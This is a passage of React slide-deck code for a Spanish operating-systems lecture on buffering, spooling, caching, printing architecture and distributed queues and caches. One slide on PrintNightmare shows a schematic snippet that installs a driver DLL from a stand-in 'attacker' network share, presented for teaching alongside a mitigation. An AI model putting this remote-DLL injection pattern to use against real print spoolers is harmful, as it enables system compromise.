                    overflowWrap: "anywhere",
                    wordBreak: "normal",
                  }}
                >
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-cache)" }}>•</span>{" "}
                    <strong>FS:</strong> Buffer caché en ext4/Btrfs (LRU
                    adaptativo).
                  </li>
                  <li style={{ lineHeight: 1.3, listStyle: "none" }}>
                    <span style={{ color: "var(--accent-cache)" }}>•</span>{" "}
                    <strong>NVMe:</strong> Migración de cuellos de botella al
                    Kernel.
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── [NUEVO] IMPRESIÓN: ANTES vs AHORA ── */}
        <Stack>
          {/* Historia de la impresión */}
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "3rem",
                }}
              >
                <Printer size={55} color="var(--accent-spool)" />
                <div>
                  <span
                    style={{
                      fontFamily: "var(--mono)",
                      fontSize: "1.1rem",
                      color: "var(--accent-spool)",
                      letterSpacing: "0.2em",
                    }}
                  >
                    EVOLUCIÓN HISTÓRICA
                  </span>
                  <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
                    Impresión: Antes del Spooling
                  </h2>
                </div>
              </div>

              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "1.5rem",
                }}
              >
                <div className="timeline-item">
                  <div
                    className="timeline-dot"
                    style={{ background: "var(--accent-red)" }}
                  ></div>
                  <div>
                    <span
                      className="era-badge"
                      style={{
                        background: "rgba(203,124,148,0.15)",
                        color: "var(--accent-red)",
                      }}
                    >
                      1950s — MAINFRAMES
                    </span>
                    <p
                      style={{
                        fontSize: "1.8rem !important",
                        margin: "0.5rem 0 0 0",
                      }}
                    >
                      <strong>Acceso exclusivo y directo.</strong> Un proceso
                      monopolizaba la impresora de línea durante toda la
                      ejecución. Si el trabajo tardaba horas, la máquina
                      completa esperaba. No existía multiprogramación real.
                    </p>
                  </div>
                </div>

                <div className="timeline-item">
                  <div
                    className="timeline-dot"
                    style={{ background: "var(--accent-gold)" }}
                  ></div>
                  <div>
                    <span
                      className="era-badge"
                      style={{
                        background: "rgba(224,193,90,0.15)",
                        color: "var(--accent-gold)",
                      }}
                    >
                      1960s — BATCH PRIMITIVO
                    </span>
                    <p
                      style={{
                        fontSize: "1.8rem !important",
                        margin: "0.5rem 0 0 0",
                      }}
                    >
                      Se introdujeron <strong>operadores humanos</strong> como
                      intermediarios: recibían tarjetas perforadas, las
                      agrupaban, y las entregaban físicamente a la impresora. El
                      "spool" era una <em>cinta magnética</em> física.
                    </p>
                  </div>
                </div>

                <div className="timeline-item">
                  <div
                    className="timeline-dot"
                    style={{ background: "var(--accent-buf)" }}
                  ></div>
                  <div>
                    <span
                      className="era-badge"
                      style={{
                        background: "rgba(127,180,202,0.15)",
                        color: "var(--accent-buf)",
                      }}
                    >
                      1965 — OS/360 IBM
                    </span>
                    <p
                      style={{
                        fontSize: "1.8rem !important",
                        margin: "0.5rem 0 0 0",
                      }}
                    >
                      IBM introduce el{" "}
                      <strong>primer spooling de software</strong>: los trabajos
                      se escriben a disco mientras otro imprime. Se eliminan los
                      cuellos de botella manuales. Nace la multiprogramación
                      moderna.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          {/* Impresión moderna */}
          <Slide data-transition="slide-in fade-out">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div style={{ marginBottom: "3rem" }}>
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                    color: "var(--accent-cache)",
                    letterSpacing: "0.2em",
                  }}
                >
                  ESTADO DEL ARTE
                </span>
                <h2 style={{ fontSize: "4.5rem", margin: "0.5rem 0 0 0" }}>
                  Impresión: Arquitectura Moderna
                </h2>
              </div>

              <div className="grid-2" style={{ gap: "4rem" }}>
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "2rem",
                  }}
                >
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-cache)" }}
                  >
                    <h4
                      style={{
                        color: "var(--accent-cache)",
                        fontSize: "2rem",
                        marginBottom: "1rem",
                      }}
                    >
                      CUPS (Linux/macOS)
                    </h4>
                    <p style={{ fontSize: "1.7rem !important", margin: 0 }}>
                      <strong>Common Unix Printing System</strong>: servidor de
                      impresión basado en IPP (Internet Printing Protocol). Cada
                      trabajo genera un archivo en <code>/var/spool/cups/</code>
                      . El scheduler IPP gestiona prioridades, reintentos y
                      colas por red.
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-spool)" }}
                  >
                    <h4
                      style={{
                        color: "var(--accent-spool)",
                        fontSize: "2rem",
                        marginBottom: "1rem",
                      }}
                    >
                      Windows Print System Remoting
                    </h4>
                    <p style={{ fontSize: "1.7rem !important", margin: 0 }}>
                      <strong>spoolsv.exe</strong> orquesta drivers en espacio
                      de usuario (post-PrintNightmare). Soporte nativo para{" "}
                      <strong>XPS/OpenXPS</strong> que reemplaza el pipeline GDI
                      clásico, eliminando conversiones EMF→PCL intermedias.
                    </p>
                  </div>
                </div>

                <div className="glass-card" style={{ padding: "3rem" }}>
                  <h4
                    style={{
                      fontSize: "2.2rem",
                      color: "var(--accent-gold)",
                      marginBottom: "2rem",
                    }}
                  >
                    Pipeline de Impresión Actual
                  </h4>
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: "1rem",
                    }}
                  >
                    {[
                      {
                        step: "01",
                        label: "App genera documento",
                        detail: "PDF / XPS / PostScript",
                        color: "var(--accent-buf)",
                      },
                      {
                        step: "02",
                        label: "Spooler intercepta",
                        detail: "Escribe en /spool, libera la app",
                        color: "var(--accent-spool)",
                      },
                      {
                        step: "03",
                        label: "Procesador de impresión",
                        detail:
                          "Convierte al lenguaje del driver (PCL6, IPP Everywhere)",
                        color: "var(--accent-gold)",
                      },
                      {
                        step: "04",
                        label: "Monitor de puerto",
                        detail: "Envía por USB / TCP/IP / SMB",
                        color: "var(--accent-cache)",
                      },
                    ].map((item) => (
                      <div
                        key={item.step}
                        style={{
                          display: "flex",
                          gap: "1.5rem",
                          alignItems: "center",
                          padding: "0.8rem",
                          borderRadius: "12px",
                          background: "rgba(255,255,255,0.03)",
                        }}
                      >
                        <span
                          style={{
                            fontFamily: "var(--mono)",
                            color: item.color,
                            fontWeight: 800,
                            fontSize: "1.3rem",
                            minWidth: "2.5rem",
                          }}
                        >
                          {item.step}
                        </span>
                        <div>
                          <div
                            style={{
                              fontSize: "1.6rem",
                              fontWeight: 700,
                              color: "var(--fg)",
                            }}
                          >
                            {item.label}
                          </div>
                          <div
                            style={{
                              fontSize: "1.2rem",
                              color: "var(--subtext)",
                              fontFamily: "var(--mono)",
                            }}
                          >
                            {item.detail}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── CASO CRÍTICO: SPOOLING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "3rem",
                }}
              >
                <RotateCcw size={50} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
                  Análisis Crítico: Spooling
                </h2>
              </div>
              <div className="grid-2">
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "2rem",
                  }}
                >
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-spool)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      1. Exclusividad y Serialización
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Almacena trabajos completos en disco y los entrega
                      secuencialmente (FIFO), garantizando procesamiento atómico
                      sin intercalar páginas.
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-buf)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      2. Multiprogramación Real
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Libera el proceso usuario inmediatamente. El spooler opera
                      como un servicio de sistema independiente (segundo plano).
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-cache)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      3. Tolerancia a Fallos
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Los datos residen en disco no volátil. Permite reanudar
                      impresiones tras un corte de energía (a diferencia del
                      buffering).
                    </p>
                  </div>
                </div>
                <div className="glass-card" style={{ padding: "3rem" }}>
                  <h4
                    style={{
                      fontSize: "2.2rem",
                      color: "var(--accent-gold)",
                      marginBottom: "1.5rem",
                    }}
                  >
                    Abstracción de Formatos
                  </h4>
                  <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5 }}>
                    El motor GDI realiza spooling de instrucciones como archivos
                    EMF, procesados por drivers específicos (PCL, PostScript).
                  </p>
                  <div className="technical-note" style={{ marginTop: "2rem" }}>
                    <strong style={{ color: "var(--accent-buf)" }}>
                      Ruta XPS Moderna:
                    </strong>{" "}
                    Pasa archivos directamente al dispositivo, eliminando
                    conversiones intermedias y reduciendo latencia.
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide data-transition="slide-in fade-out">
            <div
              style={{
                padding: "0 5%",
                height: "100%",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
              }}
            >
              <div
                className="grid-2"
                style={{
                  gap: "6rem",
                  alignItems: "center",
                  maxWidth: "1800px",
                  margin: "0 auto",
                }}
              >
                <div
                  style={{
                    textAlign: "left",
                    display: "flex",
                    flexDirection: "column",
                    gap: "2.5rem",
                    width: "100%",
                  }}
                >
                  <div>
                    <span
                      className="presenter-tag"
                      style={{
                        background: "rgba(203, 124, 148, 0.1)",
                        color: "var(--accent-red)",
                        borderColor: "rgba(203, 124, 148, 0.3)",
                        marginBottom: "1.5rem",
                      }}
                    >
                      AUDITORÍA // CVE-2021-34527
                    </span>
                    <h2
                      style={{
                        fontSize: "6rem",
                        margin: 0,
                        lineHeight: "1",
                        letterSpacing: "-0.02em",
                      }}
                    >
                      PrintNightmare
                    </h2>
                  </div>

                  <div
                    className="glass-card"
                    style={{
                      borderColor: "rgba(203, 124, 148, 0.3)",
                      padding: "3.5rem",
                      position: "relative",
                      overflow: "hidden",
                    }}
                  >
                    <div
                      style={{
                        position: "absolute",
                        top: "-20px",
                        right: "-20px",
                        opacity: 0.05,
                        pointerEvents: "none",
                      }}
                    >
                      <ShieldAlert size={250} color="var(--accent-red)" />
                    </div>
                    <p
                      style={{
                        fontSize: "2.5rem !important",
                        color: "var(--fg)",
                        lineHeight: "1.4",
                        margin: 0,
                        position: "relative",
                        zIndex: 1,
                      }}
                    >
                      Los servicios de Spooler legados permitieron la{" "}
                      <strong>Ejecución Remota de Código</strong> mediante la
                      inyección de DLLs arbitrarias. Según Walters (2025), la
                      postura de seguridad ha mejorado eliminando ejecuciones
                      remotas de código.
                    </p>
                    <div
                      style={{
                        marginTop: "2rem",
                        display: "grid",
                        gridTemplateColumns: "1fr 1fr",
                        gap: "1rem",
                      }}
                    >
                      <div
                        className="metric-card"
                        style={{ textAlign: "center" }}
                      >
                        <div
                          className="metric-val"
                          style={{ color: "var(--accent-red)" }}
                        >
                          35
                        </div>
                        <div className="metric-label">
                          Vulnerabilidades en 2022
                        </div>
                      </div>
                      <div
                        className="metric-card"
                        style={{ textAlign: "center" }}
                      >
                        <div
                          className="metric-val"
                          style={{ color: "var(--accent-cache)" }}
                        >
                          0
                        </div>
                        <div className="metric-label">RCEs desde 2021</div>
                      </div>
                    </div>
                  </div>

                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "1.5rem",
                      color: "var(--accent-red)",
                      background: "rgba(203, 124, 148, 0.1)",
                      padding: "2rem",
                      borderRadius: "20px",
                      border: "1px solid rgba(203, 124, 148, 0.2)",
                    }}
                  >
                    <ShieldAlert size={40} />
                    <span
                      style={{
                        fontWeight: 800,
                        fontSize: "2rem",
                        letterSpacing: "0.05em",
                      }}
                    >
                      FALLO CRÍTICO DE ARQUITECTURA
                    </span>
                  </div>
                </div>

                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "3rem",
                    width: "100%",
                  }}
                >
                  <div
                    style={{
                      borderRadius: "24px",
                      overflow: "hidden",
                      boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
                      border: "1px solid var(--line)",
                    }}
                  >
                    <Code
                      language="javascript"
                      lineNumbers="1|3-5|7"
                      style={{
                        fontSize: "1.7rem",
                        padding: "2.5rem",
                        margin: 0,
                      }}
                    >
                      {`// Ataque RpcAddPrinterDriverEx
const evilDLL = "\\\\\\\\attacker\\\\exploit.dll";

// Inyección en el Spooler persistente
installDriver(evilDLL); 

// Resultado: Compromiso Total`}
                    </Code>
                  </div>

                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    whileInView={{ opacity: 1, scale: 1 }}
                    className="technical-note"
                    style={{
                      margin: 0,
                      borderColor: "var(--accent-red)",
                      background: "rgba(255, 255, 255, 0.03)",
                      padding: "2.5rem",
                      borderRadius: "24px",
                      borderLeftWidth: "12px",
                    }}
                  >
                    <h4
                      style={{
                        fontSize: "2.2rem !important",
                        color: "var(--fg)",
                        marginBottom: "1rem",
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                      }}
                    >
                      <ArrowRight color="var(--accent-red)" /> Mitigación
                    </h4>
                    <p
                      style={{
                        fontSize: "2rem !important",
                        margin: 0,
                        lineHeight: "1.4",
                      }}
                    >
                      Aislamiento de procesos y <strong>Sandboxing</strong> de
                      colas de impresión.
                    </p>
                  </motion.div>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── [NUEVO] SISTEMAS DISTRIBUIDOS: BUFFERING ── */}
        <Slide data-transition="zoom">
          <div style={{ padding: "0 8%", textAlign: "left" }}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "2rem",
                marginBottom: "3rem",
              }}
            >
              <Network size={55} color="var(--accent-buf)" />
              <div>
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                    color: "var(--accent-buf)",
                    letterSpacing: "0.2em",
                  }}
                >
                  SISTEMAS DISTRIBUIDOS
                </span>
                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
                  Buffering en Entornos Distribuidos
                </h2>
              </div>
            </div>

            <div className="grid-2" style={{ gap: "4rem" }}>
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "2rem",
                }}
              >
                <div
                  className="metric-card"
                  style={{ borderLeft: "4px solid var(--accent-buf)" }}
                >
                  <h4
                    style={{
                      color: "var(--accent-buf)",
                      fontSize: "2rem",
                      marginBottom: "0.8rem",
                    }}
                  >
                    Apache Kafka — Log de Eventos
                  </h4>
                  <p style={{ fontSize: "1.6rem !important", margin: 0 }}>
                    Kafka actúa como un{" "}
                    <strong>buffer distribuido persistente</strong>. Los
                    productores escriben a particiones (disco) sin esperar a los
                    consumidores. Desacopla microservicios que operan a
                    velocidades distintas — el mismo principio del spooling,
                    pero a escala de clúster.
                  </p>
                </div>
                <div
                  className="metric-card"
                  style={{ borderLeft: "4px solid var(--accent-gold)" }}
                >
                  <h4
                    style={{
                      color: "var(--accent-gold)",
                      fontSize: "2rem",
                      marginBottom: "0.8rem",
                    }}
                  >
                    TCP Receive/Send Buffers
                  </h4>
                  <p style={{ fontSize: "1.6rem !important", margin: 0 }}>
                    El kernel mantiene buffers de envío y recepción por socket.
                    El <strong>control de flujo</strong> (ventana deslizante) es
                    buffer management distribuido: el receptor anuncia cuánto
                    espacio tiene, previniendo overflow entre nodos remotos.
                  </p>
                </div>
              </div>

              <div className="glass-card" style={{ padding: "3rem" }}>
                <h4
                  style={{
                    fontSize: "2.2rem",
                    color: "var(--accent-spool)",
                    marginBottom: "2rem",
                  }}
                >
                  RabbitMQ — Message Queuing
                </h4>
                <p
                  style={{
                    fontSize: "1.8rem !important",
                    lineHeight: 1.5,
                    marginBottom: "2rem",
                  }}
                >
                  Patrón <strong>productor-consumidor distribuido</strong>: los
                  mensajes se bufferean en colas persistentes. Si el consumidor
                  cae, los mensajes sobreviven — análogo al spooling en disco
                  local.
                </p>
                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "1fr 1fr",
                    gap: "1rem",
                  }}
                >
                  <div className="metric-card" style={{ textAlign: "center" }}>
                    <div
                      className="metric-val"
                      style={{ color: "var(--accent-buf)" }}
                    >
                      ACK
                    </div>
                    <div className="metric-label">Confirmación explícita</div>
                  </div>
                  <div className="metric-card" style={{ textAlign: "center" }}>
                    <div
                      className="metric-val"
                      style={{ color: "var(--accent-cache)" }}
                    >
                      DLQ
                    </div>
                    <div className="metric-label">Dead Letter Queue</div>
                  </div>
                </div>
                <div className="technical-note" style={{ marginTop: "1.5rem" }}>
                  <strong>Analogía clave:</strong> Kafka/RabbitMQ = Spooling
                  distribuido. Buffer local en RAM = Buffering clásico. La
                  arquitectura es la misma; el medio es la red.
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── [NUEVO] SISTEMAS DISTRIBUIDOS: CACHING ── */}
        <Slide data-transition="zoom">
          <div
            style={{
              padding: "0 5%",
              textAlign: "left",
              height: "100%",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
            }}
          >
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "2rem",
                marginBottom: "2rem",
              }}
            >
              <Globe size={55} color="var(--accent-cache)" />
              <div>
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                    color: "var(--accent-cache)",
                    letterSpacing: "0.2em",
                  }}
                >
                  SISTEMAS DISTRIBUIDOS
                </span>
                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
                  Caching Distribuido
                </h2>
              </div>
            </div>

            <div
              style={{
                display: "grid",
                gridTemplateColumns: "repeat(3, 1fr)",
                gap: "1rem",
                alignItems: "stretch",
                width: "100%",
                boxSizing: "border-box",
              }}
            >
              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-buf)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <Server size={24} color="var(--accent-buf)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-buf)",
                    }}
                  >
                    Redis
                  </h3>
                </div>
                <p
                  style={{
                    fontSize: "1.2rem !important",
                    margin: "0 0 1rem 0",
                    flexGrow: 1,
                    overflowWrap: "anywhere",
                  }}
                >
                  <strong>Caché en memoria</strong> distribuida con estructuras
                  de datos ricas. Soporta replicación.
                </p>
                <div
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "0.9rem",
                    color: "var(--accent-buf)",
                    opacity: 0.7,
                    background: "rgba(255,255,255,0.03)",
                    padding: "0.5rem",
                    borderRadius: "8px",
                  }}
                >
                  Latencia: ~0.1 ms
                </div>
              </div>

              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-gold)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <Globe size={24} color="var(--accent-gold)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-gold)",
                    }}
                  >
                    CDN
                  </h3>
                </div>
                <p
                  style={{
                    fontSize: "1.2rem !important",
                    margin: "0 0 1rem 0",
                    flexGrow: 1,
                    overflowWrap: "anywhere",
                  }}
                >
                  <strong>Distribución global</strong>: PoPs que reducen
                  latencia de ~200 ms a ~5 ms.
                </p>
                <div
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "0.9rem",
                    color: "var(--accent-gold)",
                    opacity: 0.7,
                    background: "rgba(255,255,255,0.03)",
                    padding: "0.5rem",
                    borderRadius: "8px",
                  }}
                >
                  Cache-Control / ETag
                </div>
              </div>

              <div
                className="glass-card"
                style={{
                  padding: "1.5rem",
                  borderTop: "6px solid var(--accent-cache)",
                  display: "flex",
                  flexDirection: "column",
                  height: "100%",
                  minWidth: 0,
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  <Database size={24} color="var(--accent-cache)" />
                  <h3
                    style={{
                      fontSize: "1.6rem",
                      margin: 0,
                      color: "var(--accent-cache)",
                    }}
                  >
                    Memcached
                  </h3>
                </div>
                <p
                  style={{
                    fontSize: "1.2rem !important",
                    margin: "0 0 1rem 0",
                    flexGrow: 1,
                    overflowWrap: "anywhere",
                  }}
                >
                  <strong>Clave-valor</strong> de alta velocidad. Sin
                  persistencia. Reduce carga en DB relacionales.
                </p>
                <div
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "0.9rem",
                    color: "var(--accent-cache)",
                    opacity: 0.7,
                    background: "rgba(255,255,255,0.03)",
                    padding: "0.5rem",
                    borderRadius: "8px",
                  }}
                >
                  Consistent Hashing
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── CONCLUSIÓN ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: "0 10%",
            }}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              whileInView={{ scale: 1, opacity: 1 }}
              className="glass-card"
              style={{
                maxWidth: "1400px",
                textAlign: "left",
                padding: "4rem",
              }}
            >
              <h2 style={{ fontSize: "4.5rem", marginBottom: "2.5rem", color: "var(--accent-gold) !important" }}>
                Conclusión Arquitectónica
              </h2>
              
              <div style={{ display: "flex", flexDirection: "column", gap: "2rem" }}>
                <p
                  style={{
                    fontSize: "2.2rem !important",
                    lineHeight: "1.4",
                    color: "var(--fg)",
                    margin: 0,
                  }}
                >
                  Una CPU rápida no necesita esperar a dispositivos lentos gracias a tres mecanismos clave del sistema operativo: 
                  <span style={{ color: "var(--accent-buf)" }}> buffering</span>, 
                  <span style={{ color: "var(--accent-spool)" }}> spooling</span> y 
                  <span style={{ color: "var(--accent-cache)" }}> caching</span>.
                </p>

                <div className="grid-3" style={{ gap: "1.5rem", marginTop: "1rem" }}>
                  <div className="technical-note" style={{ borderColor: "var(--accent-buf)", margin: 0 }}>
                    <p style={{ fontSize: "1.6rem !important", margin: 0 }}><strong>Buffering:</strong> RAM para equilibrar diferencias de velocidad.</p>
                  </div>
                  <div className="technical-note" style={{ borderColor: "var(--accent-spool)", margin: 0 }}>
                    <p style={{ fontSize: "1.6rem !important", margin: 0 }}><strong>Spooling:</strong> Colas para compartir dispositivos exclusivos.</p>
                  </div>
                  <div className="technical-note" style={{ borderColor: "var(--accent-cache)", margin: 0 }}>
                    <p style={{ fontSize: "1.6rem !important", margin: 0 }}><strong>Caching:</strong> Datos frecuentes en memoria rápida.</p>
                  </div>
                </div>

                <p
                  style={{
                    fontSize: "2.2rem !important",
                    lineHeight: "1.4",
                    color: "var(--subtext)",
                    margin: 0,
                  }}
                >
                  Estos principios siguen vigentes en la computación moderna. Tecnologías como <strong>Kafka, Redis, RabbitMQ y los CDN</strong> aplican las mismas ideas a gran escala.
                </p>

                <div
                  style={{
                    background: "rgba(255,255,255,0.03)",
                    padding: "2rem",
                    borderRadius: "16px",
                    borderLeft: "8px solid var(--accent-gold)",
                    marginTop: "1rem"
                  }}
                >
                  <p style={{ fontSize: "2.4rem !important", fontWeight: 700, color: "var(--fg)", margin: 0 }}>
                    La eficiencia no depende solo del hardware, sino de cómo se administra inteligentemente la latencia y los recursos del sistema.
                  </p>
                </div>
              </div>

              <div
                style={{
                  borderTop: "1px solid var(--line)",
                  paddingTop: "2rem",
                  marginTop: "3rem",
                  opacity: 0.5,
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center"
                }}
              >
                <p style={{ fontSize: "1.2rem !important", fontFamily: "var(--mono)", margin: 0 }}>
                  SISTEMAS OPERATIVOS // 2026
                </p>
                <div style={{ display: "flex", gap: "1.5rem" }}>
                   <Layers size={20} color="var(--accent-buf)" />
                   <RotateCcw size={20} color="var(--accent-spool)" />
                   <Activity size={20} color="var(--accent-cache)" />
                </div>
              </div>
            </motion.div>
          </div>
        </Slide>
      </Deck>
    </>
  );
}
